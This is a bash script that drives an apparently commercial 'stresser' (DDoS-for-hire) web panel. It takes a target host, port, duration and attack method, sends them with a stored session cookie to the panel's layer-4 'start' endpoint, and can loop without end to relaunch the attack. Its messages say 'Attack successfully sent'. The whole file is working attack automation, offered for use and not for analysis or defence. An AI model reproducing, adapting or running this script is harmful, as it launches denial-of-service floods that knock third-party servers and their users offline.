#!/bin/bash

# Function to show script usage
usage() {
  echo "Usage: $0 -h <Host> -p <Port> -t <Time> -m <Method> [-r]"
  echo "  -h : Host"
  echo "  -p : Port"
  echo "  -t : Time (interval in seconds)"
  echo "  -m : Method"
  echo "  -r : Optional flag to repeat the cURL command using the time as the interval"
  exit 1
}

# Prompt the user for input if arguments are missing
wizard_prompt() {
  if [ -z "$HOST" ]; then
    read -p "Enter Host: " HOST
  fi

  if [ -z "$PORT" ]; then
    read -p "Enter Port: " PORT
  fi

  if [ -z "$TIME" ]; then
    read -p "Enter Time (interval in seconds): " TIME
  fi

  if [ -z "$METHOD" ]; then
    read -p "Enter Method: " METHOD
  fi

  if [ -z "$REPEAT" ]; then
    read -p "Repeat Request? (y/n): " REPEAT_STR
    if [ "$REPEAT_STR" = "y" ]; then
      REPEAT=true
    else
      REPEAT=false
    fi
  fi
}

# Parse command-line arguments
while getopts ":h:p:t:m:r" opt; do
  case ${opt} in
    h) HOST=$OPTARG ;;
    p) PORT=$OPTARG ;;
    t) TIME=$OPTARG ;;
    m) METHOD=$OPTARG ;;
    r) REPEAT=true ;; # If -r is passed, repeat the request
    *) usage ;;
  esac
done

# Call the wizard prompt if any required argument is missing
if [ -z "$HOST" ] || [ -z "$PORT" ] || [ -z "$TIME" ] || [ -z "$METHOD" ]; then
  echo "Starting wizard to gather missing parameters..."
  wizard_prompt
fi

# Ensure that the required values are now provided
if [ -z "$HOST" ] || [ -z "$PORT" ] || [ -z "$TIME" ] || [ -z "$METHOD" ]; then
  echo "Error: Missing required arguments."
  usage
fi

# The cookie you provided
COOKIE=$(cat cookie.txt)

# Function to send cURL request and check response status
send_request() {
  response=$(curl -s 'https://cfxsecurity.ru/dash/rest/user/start?type=l4' \
    -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' \
    -H 'Accept: */*' \
    -H 'X-Requested-With: XMLHttpRequest' \
    -H 'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36' \
    -H 'Referer: https://cfxsecurity.ru/dash/stress' \
    -H "Cookie: $COOKIE" \
    --data-raw "host=$HOST&port=$PORT&time=$TIME&method=$METHOD&concs=1&game_type=&subnet=&origin=&payload=" \
    --compressed)

  # Parse the response manually
  status=$(echo "$response" | grep -o '"status":"[^"]*' | cut -d'"' -f4)

  # Check if the response status is "success"
  if [ "$status" == "success" ]; then
    echo "Attack successfully sent with Host=$HOST, Port=$PORT, Time=$TIME, Method=$METHOD"
  else
    echo "Failed to send attack. Response: $response"
  fi
}

# Run the cURL command based on the repeat flag
if [ "$REPEAT" = true ]; then
  while true; do
    send_request
    echo "Waiting for $TIME seconds before sending the next request..."
    sleep $TIME
  done
else
  # If not repeating, send the request just once
  send_request
fi
